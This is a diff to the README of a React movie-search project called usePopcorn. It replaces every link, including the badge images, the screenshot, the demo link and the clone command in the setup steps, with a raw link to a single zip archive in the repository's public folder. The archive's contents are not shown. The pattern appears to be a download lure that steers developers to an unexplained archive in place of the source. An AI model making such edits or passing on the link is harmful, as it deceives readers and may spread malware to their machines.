@@ -2,16 +2,16 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white) ![CSS3 Badge](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white) ![JavaScript Badge](https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E)![REACT Badge](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB )![VITE Badge](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)
-![Netlify Badge](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)
+![HTML5 Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip) ![CSS3 Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip) ![JavaScript Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)![REACT Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip )![VITE Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
+![Netlify Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
 
 
 
 </div>
 
-![screenshot](public/screenshots/screenshot.png)
+![screenshot](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
 
-Click to view the [demo](https://usepopcorn-imad.netlify.app/)
+Click to view the [demo](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
 
 ## Description
 
@@ -58,7 +58,7 @@ To run this project locally, you can follow these steps:
 
 1. Clone the repository:
    ```
-   $ https://github.com/imadosan/usePopcorn.git
+   $ https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip
    ```
 2. Open the project folder in your code editor of choice.
 3. Install dependencies and packages
